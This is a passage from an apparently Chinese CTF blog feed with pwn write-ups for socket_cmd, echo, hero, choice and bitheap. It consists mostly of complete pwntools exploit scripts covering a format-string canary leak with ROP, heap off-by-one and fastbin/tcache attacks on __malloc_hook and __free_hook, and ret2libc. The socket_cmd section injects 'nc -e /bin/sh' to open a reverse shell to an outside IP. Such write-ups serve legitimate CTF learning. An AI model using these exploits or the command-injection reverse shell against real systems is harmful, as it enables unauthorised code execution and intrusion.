class="hljs-number">4</span>    <span class="hljs-comment">#fp</span><br>payload += p32(libcbase + <span class="hljs-number">0x2fb10</span>)    <span class="hljs-comment">#ra</span><br><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span><br>payload += p32(libcbase + <span class="hljs-number">0x214a0</span>)    <span class="hljs-comment">#s0</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s1</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s2</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s3</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s4</span><br>payload += p32(libcbase + <span class="hljs-number">0x1b230</span>)<br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x28</span><br>payload += shellcode<br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">9999</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;:&#x27;</span>, payload)<br></code></pre></td></tr></table></figure><p>执行exp</p><p><img src="/img/5/Screenshot_20221111_090644.png"></p><h3 id="socket-cmd"><a href="#socket-cmd" class="headerlink" title="socket_cmd"></a>socket_cmd</h3><p>使用snprintf函数，控制大小为0x64，程序无栈溢出漏洞。将v10的字符直接拿去和“echo ”拼接后去作为system的参数，然后输出字符串；可以使用‘&amp;’字符，当执行完输出后继续执行自己写入的命令。</p><p><img src="/img/5/Screenshot_20221112_023231.png"></p><p>就有如下exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">9999</span>)<br>cmd = <span class="hljs-string">b&#x27;/bin/sh&#x27;</span><br>payload = <span class="hljs-string">b&#x27;a &amp;&#x27;</span> + cmd<br>p.sendafter(<span class="hljs-string">b&#x27;Send me a string:&#x27;</span>, payload)<br></code></pre></td></tr></table></figure><p>也可以反弹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">9999</span>)<br>cmd = <span class="hljs-string">b&#x27;nc -e /bin/sh 192.168.184.142 8888&#x27;</span><br>payload = <span class="hljs-string">b&#x27;a &amp;&#x27;</span> + cmd<br>p.sendafter(<span class="hljs-string">b&#x27;Send me a string:&#x27;</span>, payload)<br></code></pre></td></tr></table></figure><p>执行后：<br><img src="/img/5/Screenshot_20221112_023610.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2022天津市大学生信息安全网络攻防决赛 pwn</title>
    <link href="/2022/11/05/%E5%A4%A9%E6%B4%A5%E5%B8%82%E6%94%BB%E9%98%B2/"/>
    <url>/2022/11/05/%E5%A4%A9%E6%B4%A5%E5%B8%82%E6%94%BB%E9%98%B2/</url>
    
    <content type="html"><![CDATA[<p>比赛时间只有3个小时，这里我只写出了echo、hero，还一道choice没时间去写了，后续自己在本地复现了一下。</p><h3 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h3><p>格式化字符串漏洞</p><p><img src="/img/3/Screenshot_20221105_115756.png"></p><p>先利用格式字符串读出canary的值绕过检查</p><p>利用格式字符串修改0x601068地址的值，修改为字符串<code>/bin/sh\x00</code></p><p>再利用栈溢出和system函数执行ROP</p><p><img src="/img/3/Screenshot_20221105_121837.png"></p><p>开始我想一次性修改多个字节，但好像有canary以及缓冲区太小的原因，当时一直不成功，所以就每次只修改一个字节。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;echo&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./echo&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;172.31.1.105&#x27;</span>,<span class="hljs-number">50004</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>bss = <span class="hljs-number">0x601068</span><br><br><br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;%11$p&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary))<br><br>bin_sh = <span class="hljs-number">0x0068732f6e69622f</span><br><br>pay = <span class="hljs-string">b&#x27;%47c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%98c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">1</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%105c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">2</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%110c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">3</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%47c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">4</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%115c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">5</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%104c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">6</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">7</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br><br>payload = <span class="hljs-string">b&#x27;quit&#x27;</span>.ljust(<span class="hljs-number">0x18</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(canary) + p64(<span class="hljs-number">0</span>) +  p64(<span class="hljs-number">0x4005e9</span>) + p64(<span class="hljs-number">0x400903</span>) + p64(bss) + p64(elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>])<br><br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,payload)<br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="hero"><a href="#hero" class="headerlink" title="hero"></a>hero</h3><p>在edit函数中有个单字节溢出</p><p><img src="/img/3/Screenshot_20221105_120111.png"></p><p>可以伪造修改下一个堆块的prev_size大小和size尾字节为\x00，在申请释放会本来正常申请的堆块合并。</p><p>最后利用fastbin二次释放，指向malloc_hook，<code>__realloc_hook改为onegadget</code> ， <code>__malloc_hook改为__libc_reallo</code> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;hero&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>libc = ELF(<span class="hljs-string">&#x27;libc_64.so&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./hero&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;172.31.1.105&#x27;</span>,<span class="hljs-number">50005</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">name, power</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, name)<br>    p.sendafter(<span class="hljs-string">b&#x27;power:&#x27;</span>, power)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;show?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, name, power</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;edit?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, name)<br>    p.sendafter(<span class="hljs-string">b&#x27;power:&#x27;</span>, power)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;remove?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br>add(<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x60</span> + p64(<span class="hljs-number">0x170</span>)<br>edit(<span class="hljs-number">1</span>, payload, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>show(<span class="hljs-number">1</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - <span class="hljs-number">88</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>malloc_hook = libcbase + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>libc_reallo = libcbase + <span class="hljs-number">0x846c0</span><br>onegadget = libcbase + <span class="hljs-number">0xf1117</span><br><br>add(<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>edit(<span class="hljs-number">1</span> ,<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">0</span>)<br>add(p64(malloc_hook - <span class="hljs-number">0x23</span>), <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">11</span> + p64(onegadget) + p64(libc_reallo + <span class="hljs-number">6</span>)<br>add(payload ,<span class="hljs-string">b&#x27;a&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="choice"><a href="#choice" class="headerlink" title="choice"></a>choice</h3><p>本地复现环境：2.23-0ubuntu11.3_i386</p><p>在此输入时利用最后一个字节即可覆盖nbytes的值，然后在下一次输入时让其栈溢出，最后ret2libc</p><p><img src="/img/3/Screenshot_20221105_104723.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;choice&#x27;</span>)<br>libc = elf.libc<br>p = process(<span class="hljs-string">&#x27;./choice&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>pay = <span class="hljs-string">b&#x27;a&#x27;</span>.ljust(<span class="hljs-number">20</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + <span class="hljs-string">b&#x27;\x50&#x27;</span><br>p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, pay)<br>p.sendlineafter(<span class="hljs-string">b&#x27;now&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x20</span> + p32(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p32(<span class="hljs-number">0x80485bb</span>) + p32(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>p.sendafter(<span class="hljs-string">b&#x27;it?&#x27;</span>, payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>leak = u32(p.recv(<span class="hljs-number">4</span>))<br>libcbase = leak - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>sys_addr = libcbase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libcbase + libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()<br><br>p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, pay)<br>p.sendlineafter(<span class="hljs-string">b&#x27;now&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x20</span> + p32(sys_addr) + <span class="hljs-string">b&#x27;aaaa&#x27;</span> + p32(bin_sh)<br>p.sendafter(<span class="hljs-string">b&#x27;it?&#x27;</span>, payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>祥云杯2022 sandboxheap和bitheap</title>
    <link href="/2022/11/02/%E7%A5%A5%E4%BA%91%E6%9D%AF-sandboxheap%E5%92%8Cbitheap/"/>
    <url>/2022/11/02/%E7%A5%A5%E4%BA%91%E6%9D%AF-sandboxheap%E5%92%8Cbitheap/</url>
    
    <content type="html"><![CDATA[<p>我是先写的sandboxheap，开始还以为sandbox文件是多余的，就直接单独拿sandboxheap去写，就在本地打通后，发现远程是有通过sandbox去执行sandboxheap，当时我就没能写出来。</p><p>山重水复疑无路，柳暗花明又一村！没想到bitheap漏洞和sandboxheap一模一样，而且没有sandbox，当时就只写出了bitheap。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这两道题都是一样的漏洞，主要是看懂编辑函数中的溢出和加密：</p><p>如下图将堆块写入数据的大小乘8 ，然后加1；最后是通过基于输入的8个字符去对堆中的一个字节进行位运算，每个字符可以操作堆中一个字节的一位；最后会多出一个字节影响下一个堆块的size</p><p><img src="/img/4/Screenshot_20221105_024929.png"></p><p>如下图sub_C61函数，基于堆块中的字符来位运算，但堆块初始值都是<code>0</code>，最后被写入堆块的也是0  ；如果输入的是<code>\x31</code>字符会让最后被写入堆块的的是1。</p><p><img src="/img/4/Screenshot_20221105_025735.png"></p><h3 id="堆利用"><a href="#堆利用" class="headerlink" title="堆利用"></a>堆利用</h3><p>kali对这道题使用patchelf会报错，这里我是用ubuntu完成的</p><p>由于溢出的字节只能更改下一个堆块的size的标志位（判断堆块是否被使用），需要对下一个堆块的prev_size和标志位修改，让其释放后进入unsortedbin，然后与上边的unsortedbin合并。</p><img src="/img/4/Screenshot_20221107_060716.png" style="zoom:80%;" /><p>具体写入</p><img src="/img/4/Screenshot_20221107_060903.png" style="zoom:80%;" /><h3 id="bitheap"><a href="#bitheap" class="headerlink" title="bitheap"></a>bitheap</h3><p>利用堆块重叠直接去修改__free_hook为system函数即可。</p><p>完整的exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;bitheap&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;libc-2.27.so&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br><span class="hljs-comment">#p = process([&#x27;./sandbox&#x27;,&#x27;./sandboxheap&#x27;])</span><br><span class="hljs-comment">#p = process(&#x27;./bitheap&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;39.106.13.71&#x27;</span>,<span class="hljs-number">42991</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">key</span>(<span class="hljs-params">pay</span>):<br>    pay = u64(pay)<br>    result = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        a = pay &amp; <span class="hljs-number">0xff</span><br>        <span class="hljs-comment">#print(hex(a))</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>            b = <span class="hljs-number">1</span> &lt;&lt; i<br>            <span class="hljs-keyword">if</span> b &amp; a == <span class="hljs-number">0</span>:<br>                result += <span class="hljs-string">b&#x27;\x00&#x27;</span><br>            <span class="hljs-keyword">else</span> :<br>                result += <span class="hljs-string">b&#x27;\x31&#x27;</span><br>        pay = pay &gt;&gt; <span class="hljs-number">8</span><br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>):<br>    add(i, <span class="hljs-number">0xb0</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0xb8</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>):<br>    delete(i)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">9</span>):<br>    add(i, <span class="hljs-number">0x80</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">9</span>):<br>    delete(i)<br><br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x90</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">9</span>):<br>    add(i, <span class="hljs-number">0x90</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">9</span>):<br>    delete(i)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x18</span>)<br><br><br>delete(<span class="hljs-number">0</span>)<br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x80</span> + key(p64(<span class="hljs-number">0xc0</span>)) + <span class="hljs-string">b&#x27;\x00&#x27;</span><br>edit(<span class="hljs-number">2</span>, payload)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x70</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x10</span>)<br><br>show(<span class="hljs-number">2</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>free_hook = libcbase + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>sys_addr = libcbase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x10</span>)<br><br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">3</span>)<br>payload = key(p64(free_hook))<br>edit(<span class="hljs-number">2</span>, payload)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">1</span>, key(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">3</span>, key(p64(sys_addr)))<br>delete(<span class="hljs-number">1</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="sandboxheap"><a href="#sandboxheap" class="headerlink" 